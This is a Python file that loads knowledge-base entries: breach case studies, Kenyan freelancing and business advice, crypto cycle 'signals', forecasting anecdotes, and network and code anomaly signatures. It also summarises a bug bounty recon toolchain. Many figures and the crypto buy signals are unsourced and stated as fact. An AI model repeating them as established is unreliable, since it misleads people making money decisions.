        ("target_2013", "Target Data Breach (2013): 110M credit cards stolen, 70M customer records. Method: HVAC vendor (Fazio Mechanical) credentials phished -> connected to Target's payment network via vendor portal. Attackers: Russian cybercriminal group. Tools: BlackPOS malware scraped RAM of POS terminals. Detection: US DOJ notified Target. Cost: $18.5M multi-state settlement, $202M total, CEO resigned. Lessons: Network segmentation critical (HVAC should never touch payment), vendor access must be tightly controlled, POS RAM scraping detection needed."),
        ("samsung_2022", "Samsung Lapsus$ Extortion (March 2022): 190GB of confidential Samsung data leaked. Method: Social engineering/Tech support scam to access employee accounts. Credentials: Lapsus$ group impersonated employees, requested password resets from IT helpdesk. Data: Source code for biometric unlock, encryption algorithms, TrustZone, bootloader, Knox, Samsung accounts. Lessons: Helpdesk social engineering is a primary attack vector, source code is valuable IP, need phone-based authentication verification for password reset, SIM-swap prevention."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": REAL_WORLD_SCENARIOS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_autopilot_knowledge(kb):
    col = kb.get_collection(AUTOPILOT_KNOWLEDGE)
    entries = [
        ("zero_capital_income", "Generating income with zero capital: The key insight is to sell services before building products. Your time and skills are your inventory. Platforms like Upwork, Fiverr, and Toptal let you list services for free. Start with low prices to build reputation, then raise rates. Target 5 clients, deliver exceptional work, ask for referrals, then hire subcontractors. You become an agency without any capital investment. Focus on recurring service models (maintenance, retainer, support) to build predictable monthly income."),
        ("freelance_platform_algorithms", "Freelance platform algorithms: Upwork's algorithm favors response rate, profile completeness, and earnings. Respond within 2 hours of any message. Complete your profile to 100% with portfolio samples. Win first jobs at low rates to build JSS (Job Success Score). Fiverr ranks gigs based on order completion rate, delivery time, and positive reviews. Keyword-optimize your gig titles. Use gig extras to increase order value. Toptal accepts only top 3% — pass their screening for access to premium clients paying $60-150/hr."),
        ("crypto_trading_signals", "Crypto trading signals and patterns: Bitcoin follows 4-year halving cycles — historically price peaks 12-18 months after halving. Support/resistance levels form from previous cycle highs and lows. RSI below 30 indicates oversold conditions. Fear and Greed Index below 20 is a buy signal historically. On-chain metrics: MVRV ratio below 1 indicates undervaluation. Exchange reserves dropping signals accumulation. Stablecoin dominance rising signals fear. Altcoin season index above 75 means rotate from BTC to alts. Always take profits in stages — nobody times the top perfectly."),
        ("bug_bounty_strategies", "Bug bounty hunting strategies: Focus on one program's scope deeply rather than spraying across many. Start with VRP: Informational to Medium severity bugs — less competition, faster triage. IDOR vulnerabilities are the most common high-paying bug class — test every endpoint that accepts user IDs. Use automation: nuclei + custom templates for initial reconnaissance. Subdomain enumeration via subfinder + assetfinder + amass reveals hidden attack surface. Parameter discovery with ffuf and paramspider. Always provide clear PoC with impact demonstration — this increases payout by 2-3x."),
        ("saas_growth_hacking", "SaaS growth hacking techniques: Product-led growth with freemium tier drives organic adoption. Build in public on Twitter/LinkedIn to attract early users. Launch on ProductHunt with a compelling story and demo. Use referral programs (give 1 month free for each referral). Content marketing: write about the problem you solve, not your product. SEO takes 6 months but is free traffic forever. Cold email 100 potential users per day with personalized value. Partner with complementary SaaS for cross-promotion. Target $1k MRR first, then $10k, then $100k."),
        ("content_monetization", "Content monetization strategies: Start with a platform you already use. Write technical blog posts on dev.to (free traffic from their built-in audience). Record coding tutorials for YouTube (monetize with ads + sponsors + affiliate links). Sell premium courses on Udemy/Gumroad (create once, sell forever). Newsletter on Substack (free to start, monetize with paid subscriptions). GitHub Sponsors for open source work. Digital products (templates, checklists, ebooks) on Gumroad. Affiliate marketing for tools and services you actually use."),
        ("passive_income_automation", "Passive income automation patterns: Digital products have the highest passive income potential — build once, sell infinitely. Create 10 digital products over a year, each generating KES 5,000/month on average = KES 50,000/month passive. Automate delivery with Gumroad/Lemon Squeezy. Affiliate income requires 3-6 months of content creation before earning. Set up automated affiliate link insertion with ThirstyAffiliates or similar tools. Dividend investing requires capital. Focus on high-margin digital products for zero-capital passive income."),
        ("mpesa_payment_integration", "M-Pesa and Kenyan payment integration: Safaricom's M-Pesa API allows businesses to receive payments via STK Push (Lipa Na M-Pesa Online). Register as a developer at developer.safaricom.co.ke. Use the Daraja API for C2B (customer to business) and B2C (business to customer) payments. Transaction costs: KES 0-70 depending on amount. For startups, use IntaSend (free to start, 2.5% per transaction) or Pesapal (KES 2,500 setup, 2% per transaction). M-Pesa Paybill is free to register at any Safaricom shop — essential for any Kenyan business."),
        ("east_african_business", "East African business landscape: Kenya has 55 million people with mobile money penetration of 75%. Nairobi is the tech hub of East Africa with 200+ startups and growing VC funding (over $1B in 2022). Top sectors: fintech (M-Pesa ecosystem), agritech (farm-to-market platforms), healthtech (telemedicine), edtech (online learning), logistics (last-mile delivery). The Jenga Fund and Y Combinator-backed startups operate from Nairobi. Tanzania and Uganda have growing tech scenes but smaller markets. Rwanda leads in ease of doing business rankings. Ethiopia is emerging with 120M population."),
        ("kenyan_remote_work", "Remote work opportunities for Kenyan developers: Upwork and Toptal are the primary platforms but competition is high. Specialize in niche areas: Salesforce development, Shopify theme development, WordPress customization, HubSpot integration. African-focused remote roles: Engineering positions at Flutterwave, Paystack, Andela, Twiga Foods, Cellulant. LinkedIn remote filter with location set to 'Nairobi, Kenya' shows 500+ remote roles. GitHub profile with strong contributions is your best resume. Kenyan developers earn $20-50/hr on international platforms vs KES 500-2000/hr locally."),
        ("service_proposition_design", "Service proposition design: Package your services into three tiers — Basic (KES 15,000), Standard (KES 35,000), Premium (KES 75,000). Basic includes core deliverable only. Standard adds documentation and training. Premium adds ongoing support and priority access. This pricing strategy increases average order value by 300%. Name your tiers based on value, not features. Create a one-page service sheet with: problem statement, solution overview, deliverables list, pricing, and testimonials. Use Canva free templates to design it professionally."),
        ("linkedin_b2b_sales_africa", "LinkedIn for B2B sales in Africa: Optimize your LinkedIn profile with keywords your target clients search for. Post technical content 3-4 times per week to build authority. Connect with 50 targeted decision-makers daily (Sales Navigator free trial gives 100 search results). Send personalized connection requests: reference their recent post or company news. Follow up with value — share an article relevant to their industry. African B2B decision-makers value relationships over cold pitches. Attend 2-3 virtual or in-person networking events per month. Nairobi has weekly tech meetups on Meetup.com."),
        ("client_acquisition", "Client acquisition strategies for consultants: The 5 most effective channels for freelancers in Kenya: (1) LinkedIn outreach with case studies, (2) Referral programs offering 10% commission, (3) Facebook groups for Nairobi business owners, (4) Direct email to companies that just raised funding (Crunchbase free tier), (5) Partnering with digital agencies who outsource technical work. Track every lead in a free CRM (HubSpot free tier). Follow up 5 times — 80% of sales happen after the 5th contact. Offer a free audit as your lead magnet."),
        ("consultant_pricing_nairobi", "Pricing services as a consultant in Kenya: Entry-level (0-2 years): KES 1,000-3,000/hr. Mid-level (3-5 years): KES 3,000-8,000/hr. Senior (5-10 years): KES 8,000-20,000/hr. Expert (10+ years): KES 20,000-50,000/hr. For fixed-price projects, estimate hours and multiply by hourly rate then add 20% buffer. Monthly retainers should be 10-15 hours of your time at your hourly rate. Kenyan businesses expect to negotiate — start 20% higher than your minimum. Always get 50% deposit before starting work. Use contracts even with friends."),
        ("winning_proposals", "Writing winning proposals: A winning proposal has 5 sections: (1) Understanding their problem — show you researched their business, (2) Your solution — clear scope of work with deliverables, (3) Timeline — week-by-week schedule, (4) Investment — breakdown of costs, (5) Why you — relevant experience and client testimonials. Keep proposals under 2 pages. Include a case study similar to their project. Use their language (if they say 'digitize', use 'digitize'). Send proposals within 24 hours of initial contact. Follow up 48 hours after sending. Close rate: good proposals convert at 20-30%."),
        ("contract_negotiation", "Negotiating contracts: Always get the scope of work in writing before starting. Define deliverables clearly — 'build a website' is vague, 'develop a 5-page responsive website with CMS' is specific. Payment terms: 50% upfront, 25% on milestone, 25% on completion for projects over KES 100,000. Include a change order clause — additional work beyond scope costs extra. Set expectations on revisions: 2 rounds included, additional rounds billed per hour. Late payment penalty: 5% per week overdue. Kill fee: if client cancels, you keep the deposit. Use templates from Pandadoc or Google Docs free."),
        ("client_expectation_management", "Managing client expectations: Over-communicate. Send weekly progress reports every Monday. Use a shared Trello board or Notion page where client can see progress. Under-promise and over-deliver — if you think a task takes 3 days, say 5. This creates delight when you deliver early. Document everything in writing — verbal agreements lead to scope creep. Have a kickoff meeting checklist: deliverables, timeline, communication channels, approval process. Monthly check-in calls for retainer clients prevent surprises. Always end meetings with written summary of action items."),
        ("freelancer_to_agency", "Scaling from freelancer to agency: Phase 1 (Solo): You do everything — sell, deliver, support. Max income: KES 300,000/month. Phase 2 (Subcontractor): You sell, subcontractor delivers. Profit margin: 30-50% of project value. Phase 3 (Team): Hire 2-3 juniors. You manage accounts and business development. Phase 4 (Agency): 5-15 staff. Dedicated sales, delivery, and support teams. Key: standardize your delivery process into packages. Create playbooks for common projects. Invest in CRM and project management tools. Transition from selling your time to selling your system."),
        ("recurring_revenue", "Building recurring revenue business: The holy grail of any service business is monthly recurring revenue (MRR). Options: Maintenance retainers (KES 20,000-100,000/month for keeping systems running), Support retainers (KES 15,000-50,000/month for priority support), SaaS subscriptions if you build software, Managed hosting (KES 10,000-30,000/month for hosting + maintenance). Target 70% recurring revenue and 30% project revenue. MRR of KES 500,000/month makes your business recession-resistant. It takes 6-12 months to build this. Start by converting your best project clients to retainers."),
        ("business_registration_kenya", "Registering a business in Kenya: Free/cheap options: (1) Sole Proprietorship — register business name at Huduma Centre for KES 1,000. (2) Company registration via eCitizen — KES 5,000-10,000 for company name reservation, incorporation, and certificate. (3) KRA PIN — free online, required for invoicing and tax compliance. (4) M-Pesa Paybill — free at Safaricom shop. Business bank account: KES 1,000 required deposit minimum. For tech startups: register as a Limited Company — protects personal assets. Tax: 30% corporate tax. VAT registration required if turnover exceeds KES 5M/year."),
        ("service_business_referral_automation", "Referral automation for service businesses: A referral program is the highest ROI marketing channel. System: After every successful project, send a testimonial request email. When client provides testimonial, immediately ask: 'Do you know 2-3 people who could benefit from our services? We offer a 10% commission on any project referred.' Track referrals in a simple spreadsheet. Send monthly referral partner newsletters. Create a referral landing page with your offer. Offer a free month of service for every client referred who signs a retainer. Automate with free tools: Typeform + Google Sheets + Gmail."),
        ("idea_validation", "How to validate a business idea before building: The Mom Test methodology — ask about their current behavior, not hypotheticals. Talk to 20 potential customers. You're looking for specific signals: they've tried to solve this problem before, they're spending money on current solutions, they can describe the problem in detail without prompting. Build a landing page with a 'Buy Now' button that leads to a 'Coming Soon' form — if nobody clicks, the idea won't sell. Pre-sell: if you can get 10 people to pay before you build, you have product-market fit. Anything else is a hobby."),
        ("first_10_customers", "How to find your first 10 customers: Strategy 1: Your network — message 50 people you know personally. Strategy 2: Offer your service for free to 5 people in exchange for detailed testimonials. Strategy 3: Join industry-specific Slack/Discord communities and help people — they'll hire you. Strategy 4: Write about the problem on LinkedIn and offer free audits. Strategy 5: Partner with complementary service providers (web designers need developers, for example). Strategy 6: Cold email using hunter.io (free tier). Strategy 7: Attend events with your target audience. Strategy 8: Buy a small Facebook ad targeting your exact audience (KES 1,000 test budget)."),
        ("tech_cycles", "Technology adoption cycles: Moore's Law: computing power doubles every 2 years. Metcalfe's Law: network value grows as square of users. Technology adoption follows an S-curve: slow start (innovators), rapid growth (early majority), plateau (late majority). New technologies take 10-15 years to reach mainstream adoption. AI is currently in the 'early majority' phase — rapid growth ahead. Blockchain is in 'late early adopters' phase. Web3 is in 'innovators only' phase. Best time to invest in a tech skill: during the steep part of the curve, not at the plateau."),
        ("project_estimation", "Software project estimation patterns: The Cone of Uncertainty — early estimates are 4x off. By specification phase: 2x off. By design phase: 1.5x off. Use three-point estimation: Optimistic (O), Most Likely (M), Pessimistic (P). Expected = (O + 4M + P) / 6. Track your estimation accuracy: if you estimate 10 days and take 15, your accuracy factor is 1.5. Apply your personal accuracy factor to future estimates. Never estimate in hours — estimate in half-days. Add 20% for meetings, email, overhead. Testing takes 30% of development time."),
        ("vulnerability_lifecycle", "Security vulnerability lifecycle: Discovery -> Disclosure -> CVE Assignment -> Patch Development -> Patch Deployment -> Exploit Publication -> Mass Exploitation. Timeline: vulnerabilities are discovered months before public disclosure. Zero-days are exploited for an average of 7 days before patches are available. 75% of all exploits target vulnerabilities that are 1+ years old. Most breaches come from unpatched known vulnerabilities, not zero-days. The median time to patch critical vulnerabilities is 15 days. Attackers scan for new CVEs within hours of disclosure. Patch within 48 hours for critical CVEs on public-facing systems."),
        ("crypto_market_cycles", "Crypto market cycle patterns: Bitcoin historically moves in 4-year cycles aligned with halving events. Halving years (2012, 2016, 2020, 2024): price generally ranging. Post-halving year (2013, 2017, 2021, 2025): bull run with new all-time highs. Peak euphoria phase: 6-12 months after halving, price peaks. Bear market: 12-18 months of declining prices following peak. Accumulation phase: 12-18 months of low volatility before next halving. Altcoins typically outperform BTC in the mid-to-late bull phase. Stablecoins dominate during bear markets. Plan accordingly."),
        ("startup_success_patterns", "Startup success/failure patterns: 90% of startups fail. Top 3 reasons: no market need (42%), ran out of cash (29%), not the right team (23%). Successful startups: solve a painful problem (not a nice-to-have), have a clear revenue model from day 1, achieve product-market fit within 18 months, have founders with domain expertise, iterate quickly based on user feedback, focus on a single metric (growth or revenue, not both at first). Unicorn patterns: address a large market ($1B+), have network effects, have high gross margins (80%+), are 10x better than existing solutions."),
        ("developer_productivity", "Developer productivity patterns: The 10x developer myth — productivity varies by 4-5x between developers, not 10x. Key productivity factors: deep work time (4+ hours uninterrupted per day), familiar with the codebase, expertise in the tech stack, minimal context switching, automated testing (reduces debug time by 40%), good IDE and tooling (VSCode + Copilot saves 30% time). The biggest productivity killer is meetings — protect your focus time. Pair programming is slower in the short term but produces 50% fewer bugs. Code review catches 60% of bugs."),
        ("team_performance", "Team performance patterns: Brooks's Law: adding people to a late project makes it later. Conway's Law: organizations design systems that mirror their communication structure. The ideal team size is 4-6 people — larger teams spend 25% of time on communication. Ringelmann Effect: individual productivity decreases as team size increases. Amazon's two-pizza rule: if a team can't be fed with two pizzas, it's too large. High-performing teams have: psychological safety, clear goals, autonomy, regular feedback, and shared ownership. Trust is the #1 predictor of team performance."),
        ("technical_debt", "Technical debt accumulation rates: Technical debt grows at approximately 1% of codebase per month without refactoring. A 100,000-line codebase incurs approximately 1,000 lines of technical debt per month. Refactoring 20% of time reduces technical debt to sustainable levels. The cost of fixing bugs increases exponentially over time — a bug caught in development costs 1x, in testing 5x, in production 20x. Clean code practices reduce technical debt accumulation by 50%. Automated testing catches 40% of regression debt. Code reviews catch 30%. Regular refactoring sprints (every 3 months) keep debt manageable."),
        ("learning_curve_patterns", "Learning curve patterns for new languages: Initial learning (first month): basic syntax and simple programs. Intermediate (2-3 months): common patterns and idioms, can read most code. Advanced (4-6 months): deeper features (generics, async, metaprogramming). Expert (6-12 months): performance optimization, design patterns in the language. Mastery (1-2 years): teaching others, writing libraries, contributing to ecosystem. The Dreyfus model: novice needs rules, advanced beginner needs guidelines, competent needs patterns, proficient needs principles, expert needs nothing. 20 hours of deliberate practice is enough for basic competence."),
        ("github_growth_patterns", "Open source project growth patterns: Most GitHub projects never grow beyond 10 stars. Projects that reach 100 stars: have a clear README, solve a real problem, have documentation, are easy to install. From 100 to 1,000 stars: regular releases, responsive maintainer, active issues, contribution guidelines. From 1K to 10K stars: community contributors, third-party integrations, press/blog coverage, corporate adoption. Critical tipping points: 100 stars gets you on GitHub trending. 1,000 stars gets you on radars of VCs and companies. 10,000 stars makes you an industry standard."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": AUTOPILOT_KNOWLEDGE} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_business_strategy(kb):
    col = kb.get_collection(BUSINESS_STRATEGY)
    entries = [
        ("idea_validation", "How to validate a business idea before building: The Mom Test methodology — ask about their current behavior, not hypotheticals. Talk to 20 potential customers. You're looking for specific signals: they've tried to solve this problem before, they're spending money on current solutions, they can describe the problem in detail without prompting. Build a landing page with a 'Buy Now' button that leads to a 'Coming Soon' form — if nobody clicks, the idea won't sell. Pre-sell: if you can get 10 people to pay before you build, you have product-market fit. Anything else is a hobby."),
        ("first_10_customers", "How to find your first 10 customers: Strategy 1: Your network — message 50 people you know personally. Strategy 2: Offer your service for free to 5 people in exchange for detailed testimonials. Strategy 3: Join industry-specific Slack/Discord communities and help people — they'll hire you. Strategy 4: Write about the problem on LinkedIn and offer free audits. Strategy 5: Partner with complementary service providers (web designers need developers, for example). Strategy 6: Cold email using hunter.io (free tier)."),
        ("pricing_nairobi", "How to price services as a consultant in Kenya: Entry-level (0-2 years): KES 1,000-3,000/hr. Mid-level (3-5 years): KES 3,000-8,000/hr. Senior (5-10 years): KES 8,000-20,000/hr. Expert (10+ years): KES 20,000-50,000/hr. For fixed-price projects, estimate hours and multiply by hourly rate then add 20% buffer. Monthly retainers should be 10-15 hours at your hourly rate. Kenyan businesses expect to negotiate — start 20% higher than your minimum. Always get 50% deposit."),
        ("winning_proposals", "How to write a winning proposal: A winning proposal has 5 sections: (1) Understanding their problem — show you researched their business, (2) Your solution — clear scope of work with deliverables, (3) Timeline — week-by-week schedule, (4) Investment — breakdown of costs, (5) Why you — relevant experience. Keep proposals under 2 pages. Include a case study similar to their project. Send within 24 hours. Follow up 48 hours after sending. Good proposals convert at 20-30%."),
        ("contract_negotiation", "How to negotiate contracts: Get scope in writing before starting. Define deliverables clearly. Payment terms: 50% upfront, 25% milestone, 25% completion. Include change order clause. Set expectations on revisions: 2 rounds included. Late payment penalty: 5% per week. Kill fee: if client cancels, you keep deposit."),
        ("client_expectations", "How to manage client expectations: Over-communicate. Send weekly progress reports. Use shared Trello/Notion board. Under-promise and over-deliver. Document everything in writing. Kickoff meeting checklist. Monthly check-in calls. Always end meetings with written summary of action items."),
        ("freelancer_to_agency", "How to scale from freelancer to agency: Phase 1 (Solo): You do everything. Phase 2 (Subcontractor): You sell, subcontractor delivers. Phase 3 (Team): Hire juniors. Phase 4 (Agency): 5-15 staff with departments. Standardize delivery into packages. Create playbooks. Invest in CRM. Transition from selling your time to selling your system."),
        ("recurring_revenue", "How to build recurring revenue: Options: Maintenance retainers (KES 20,000-100,000/month), Support retainers (KES 15,000-50,000/month), SaaS subscriptions, Managed hosting. Target 70% recurring revenue, 30% project revenue. MRR of KES 500,000/month makes you recession-resistant. Takes 6-12 months to build."),
        ("linkedin_b2b", "How to use LinkedIn for B2B sales in Africa: Optimize profile with relevant keywords. Post technical content 3-4x weekly. Connect with 50 decision-makers daily. Send personalized connection requests. Follow up with value. African B2B values relationships over cold pitches. Attend 2-3 networking events monthly."),
        ("business_registration_kenya", "How to register a business in Kenya: Sole Proprietorship: KES 1,000 at Huduma Centre. Company via eCitizen: KES 5,000-10,000. KRA PIN: free online. M-Pesa Paybill: free. Business bank account: KES 1,000 minimum deposit. For tech startups: register as Limited Company. Tax: 30% corporate. VAT required if turnover > KES 5M/year."),
        ("referral_automation", "Referral automation: After every successful project, send testimonial request. When client provides testimonial, ask for 2-3 referrals. Offer 10% commission on referred projects. Track in spreadsheet. Send monthly referral newsletter. Create referral landing page. Automate with free tools: Typeform + Google Sheets + Gmail."),
        ("service_packaging", "Service packaging: Package services into 3 tiers: Basic (KES 15,000), Standard (KES 35,000), Premium (KES 75,000). Basic includes core deliverable. Standard adds documentation and training. Premium adds ongoing support. This increases average order value by 300%. Create one-page service sheet with Canva free templates."),
        ("cold_outreach", "Cold outreach best practices: Research prospect before contacting. Reference something specific about their business. Keep first message under 100 words. Ask a question, don't pitch. Follow up 5 times — 80% of sales happen after 5th contact. Use multiple channels: email, LinkedIn, phone. Track everything in free CRM (HubSpot free tier)."),
        ("client_onboarding", "Client onboarding process: Day 1: Welcome email with project timeline and communication channels. Day 2: Kickoff call to align expectations. Day 3: Share project plan and milestones. First week: Deliver quick win to build trust. Set up weekly check-in schedule. Share document repository. Introduce team members. Collect all access and information needed."),
        ("upselling_strategies", "Upselling strategies for service businesses: After delivering a project, identify the next problem your client faces. Propose a solution before they ask. Bundle services at a discount. Create service tiers that naturally upgrade. Offer annual contracts with 2 months free. Add complementary services (if you built their website, offer SEO monthly retainer). Timing: upsell when they're happiest — right after a successful delivery."),
        ("exit_strategy", "Business exit strategies for Kenyan startups: Bootstrap: keep full ownership, sell when ready. VC-backed: aim for acquisition by larger tech company. Revenue-based financing: Grow Credit, Lendable. Earn-out: partial sale with performance-based additional payment. Merger with complementary business. IPO: only for very large companies. Plan your exit from day 1 — build something that larger companies would want to acquire."),
        ("lean_methodology", "Lean startup methodology: Build-Measure-Learn loop. Build minimum viable product (MVP) with essential features only. Measure customer behavior with analytics. Learn whether to pivot or persevere. Validated learning is more important than traditional metrics. Innovation accounting: track actionable, accessible, auditable metrics. Split testing for feature decisions. Cancel features that don't move metrics. Pivot when learning shows your hypothesis is wrong."),
        ("bootstrapping_strategies", "Bootstrapping strategies: Start with a service business to fund product development. Keep your day job until product revenue covers your expenses. Use free tools for everything. Focus on profitability from month 1. Charge for your product from day 1 — free users don't pay, paying users validate your idea. Hire freelancers before employees. Rent before buy. Cloud before servers. The best bootstrap strategy: sell your product before you build it."),
        ("investor_pitch", "How to pitch to investors: Your pitch deck needs 10 slides: (1) Problem, (2) Solution, (3) Market Size, (4) Product, (5) Business Model, (6) Traction, (7) Team, (8) Competition, (9) Financials, (10) Ask. Keep it under 5 minutes. Know your numbers cold. Investors invest in people first, market second, product third. Kenyan investors: Founders Factory Africa, TLcom Capital, Novastar Ventures. Warm intros are 5x more effective than cold pitches."),
        ("market_research_africa", "Market research for African markets: Use Statista, GSMA, and World Bank data for market sizing. Surveys via Google Forms (free). User interviews via Zoom (free). Competitor analysis by using their products. Social media listening via free tools (TweetDeck, Google Alerts). Key challenge: Africa data is often outdated or incomplete. Triangulate from multiple sources. Local knowledge is invaluable — talk to people in the market."),
        ("business_model_canvas", "Business Model Canvas: 9 building blocks: Customer Segments, Value Propositions, Channels, Customer Relationships, Revenue Streams, Key Resources, Key Activities, Key Partnerships, Cost Structure. Fill out in this order for a new business. The most important block is Value Proposition — if you don't know why customers will buy, nothing else matters. Iterate: your canvas will change as you learn. Free template: Strategyzer (download PDF)."),
        ("subscription_economics", "Subscription business economics: Key metrics: MRR (Monthly Recurring Revenue), Churn Rate (customers lost per month), LTV (Lifetime Value = ARPU / Churn), CAC (Customer Acquisition Cost), LTV:CAC ratio (should be 3:1 or higher). Healthy SaaS: Monthly churn under 5%, LTV:CAC > 3, Payback period < 12 months. Reduce churn by 5% and profits increase by 25-95%. Free tools: Baremetrics for tracking, ChartMogul for analytics."),
        ("pricing_strategies", "Pricing strategies for digital products: Value-based pricing: what is the problem worth to the customer? If your SaaS saves a company KES 500,000/year, charge KES 50,000/year. Tiered pricing: 3 plans, middle plan is your target. Decoy pricing: make the middle plan look best by adding an expensive third option. Annual vs monthly: offer 2 months free for annual billing. Free trial: 14-30 days with no credit card. Price anchoring: show a higher price first, then your actual price."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": BUSINESS_STRATEGY} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_prediction_accuracy(kb):
    col = kb.get_collection(PREDICTION_ACCURACY)
    entries = [
        ("moores_law", "Moore's Law: Gordon Moore predicted in 1965 that transistor density would double every 2 years. This prediction held true for 50+ years. Pattern: exponential growth in computing power follows predictable cadence. Key insight: technology progress is more predictable than most people assume. Exponential curves look linear in the short term. Many experts predicted Moore's Law would end by 2010 but it continued through 2025+ through innovation (EUV lithography, new architectures)."),
        ("metcalfes_law", "Metcalfe's Law: Robert Metcalfe predicted network value grows as the square of users (n^2). 3Com's value was predicted to follow this. Initially criticized, now accepted as foundational. Pattern: network effects create non-linear growth. Examples: Facebook, WhatsApp, Ethereum. Prediction accuracy: directionally correct, exact magnitude varies. Key insight: any platform with users should value growth over revenue initially."),
        ("crypto_halving", "Bitcoin halving cycles: Whitepaper (2008) predicted 21M cap with 4-year halving schedule. Each halving has preceded a major bull run within 12-18 months. 2012 halving -> 2013 peak ($1,000). 2016 halving -> 2017 peak ($20,000). 2020 halving -> 2021 peak ($69,000). Pattern has held for 3 cycles. Accuracy: timing predictions are imprecise (months off) but direction is reliable. Diminishing returns: each cycle's peak multiple decreases."),
        ("housing_bubble", "Housing bubble prediction: Robert Shiller predicted housing bubble using price-to-rent and price-to-income ratios. CAPE ratio (Cyclically Adjusted P/E) predicted 2000 dot-com crash and 2008 housing crash. Pattern: market bubbles follow predictable phases — displacement, boom, euphoria, profit-taking, panic. Key insight: same pattern repeats across different asset classes. Prediction based on mean reversion — things that go up a lot tend to come back down."),
        ("pandemic_prediction", "Pandemic prediction: Bill Gates warned in 2015 TED talk that the next global threat would be a virus, not a missile. Pattern: pandemic preparedness is consistently underfunded. Key insight: low-probability, high-impact events are systematically underestimated. Probability: experts estimated 2-5% chance of pandemic per year before COVID. After COVID: higher awareness but still underprepared. Next likely: AI-related catastrophic risks."),
        ("software_estimation", "Software estimation patterns: The Cone of Uncertainty predicts that early estimates are 4x inaccurate. This pattern holds across thousands of projects. Waterfall projects are 3x more likely to exceed estimates than agile projects. Brooks's Law: adding people to late projects makes them later — confirmed by 50+ years of data. Function point analysis estimates within 20% accuracy when done properly. Key insight: software estimation is systematically optimistic."),
        ("startup_failure", "Startup failure prediction: 90% of startups fail. CB Insights analysis of 100+ failed startups shows predictable patterns: no market need (42%), ran out of cash (29%), wrong team (23%). Prediction accuracy: individual startup outcomes are unpredictable, but aggregate patterns are highly reliable. VC portfolio theory: 70% of returns come from 5% of investments. Key insight: predict portfolio outcomes, not individual company outcomes."),
        ("ai_progress", "AI progress prediction: Raymond Kurzweil's Law of Accelerating Returns predicted AI would reach human-level capability by 2029. Pattern: AI benchmarks (ImageNet, SuperGLUE, MATH) have been beaten faster than most experts predicted. GPT-3 (2020) surprised many with emergent abilities. Accuracy: trend predictions are reliable, specific milestone timing is not. Key insight: AI progress is likely to accelerate, not decelerate."),
        ("climate_models", "Climate prediction models: Climate models from the 1970s predicted warming patterns with 90%+ accuracy for temperature trends. Pattern: scientific consensus predictions are more accurate than contrarian predictions. Key insight: models that make specific, falsifiable predictions tend to be more accurate than vague predictions. Accuracy improves as more data becomes available."),
        ("election_predictions", "Election prediction patterns: FiveThirtyEight correctly predicted 2012 (all 50 states) and 2020 (correct winner) but missed Trump 2016 (gave 29% chance). Pattern: prediction markets are more accurate than polls. Key insight: aggregate models are better than individual pundits. Uncertainty should be expressed as probability, not binary. 'Impossible' events happen 1-5% of the time."),
        ("developer_adoption", "Technology adoption curves: Docker (2013) took 3 years to mainstream. Kubernetes (2015) took 4 years. ChatGPT (2022) took 2 months to reach 100M users. Pattern: adoption speed is accelerating. Key insight: developer tools that solve real pain points spread faster than consumer apps in the early stages. Prediction: AI-assisted development will be standard within 2 years."),
        ("tech_trends", "Technology trend prediction accuracy: Gartner Hype Cycle predictions are directionally correct but timing is often off by 2-3 years. Pattern: new technologies go through 5 phases: Innovation Trigger, Peak of Inflated Expectations, Trough of Disillusionment, Slope of Enlightenment, Plateau of Productivity. Most technologies take 5-10 years from trigger to plateau. Accuracy: identifying the phase is reliable, predicting exact timing is not."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": PREDICTION_ACCURACY} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_eagle_eye_patterns(kb):
    col = kb.get_collection(EAGLE_EYE_PATTERNS)
    entries = [
        ("network_anomaly", "Network anomaly signatures: Port scanning: rapid connections to many ports within seconds. DDoS: traffic volume 10x+ above baseline. Data exfiltration: large outbound data volumes at unusual times. DNS tunneling: DNS queries with unusual subdomain patterns. Beaconing: regular small packets to external IPs at fixed intervals. ARP spoofing: multiple MAC addresses claiming same IP. Key indicators: traffic outside normal business hours, connections to known-bad IPs, unusual protocol combinations."),
        ("code_quality_degradation", "Code quality degradation patterns: Increasing cyclomatic complexity over time. Test coverage decreasing as codebase grows. More TODOs and FIXMEs per commit. Increasing time to implement new features. Bug fix rate increasing. More edge cases and special conditions. Long functions being created. Duplicate code increasing. Pattern: quality degrades at ~1% per month without active refactoring. Detect by: running linters regularly, tracking complexity trends, monitoring test coverage."),
        ("security_misconfig", "Security misconfiguration patterns: Default credentials remaining in production. Debug endpoints exposed. CORS configured as wildcard (*). Missing security headers. HTTPS not enforced. Unnecessary open ports. Excessive permissions on cloud storage. Unencrypted secrets in config files. Pattern: 60% of breaches involve misconfigurations. Detect by: automated scanning tools (nuclei, ScoutSuite), regular security audits, configuration drift monitoring."),
        ("performance_bottleneck", "Performance bottleneck signatures: Database: slow queries (full table scans, missing indexes). CPU: sustained 90%+ utilization. Memory: swap usage increasing, OOM kills. I/O: high disk latency (>100ms). Network: packet loss >1%, high latency. Application: N+1 queries, large JSON payloads, synchronous operations that should be async. Pattern: bottlenecks compound — fixing one reveals another. Detect by: APM tools, profiling, load testing."),
        ("memory_leak_patterns", "Memory leak patterns: Python: circular references with __del__, unclosed file handles, cached data that grows unbounded, threading.Thread objects not cleaned up, global lists/dicts that grow. JavaScript: detached DOM nodes, closures holding references, forgotten timers/intervals, event listeners not removed. Pattern: memory usage increases steadily until GC runs, then drops partially but not to baseline. Detect by: monitoring heap growth across GC cycles, using memory profilers."),
        ("race_condition_signatures", "Race condition signatures: Intermittent bugs that only occur under load. Test passes 99% of time. Different results on consecutive identical runs. Timestamps out of order. Data corruption that's hard to reproduce. Pattern: race conditions increase with system complexity and concurrency. Common in: async event handlers, shared state without locks, database transactions without proper isolation levels. Detect by: stress testing, ThreadSanitizer, careful code review."),
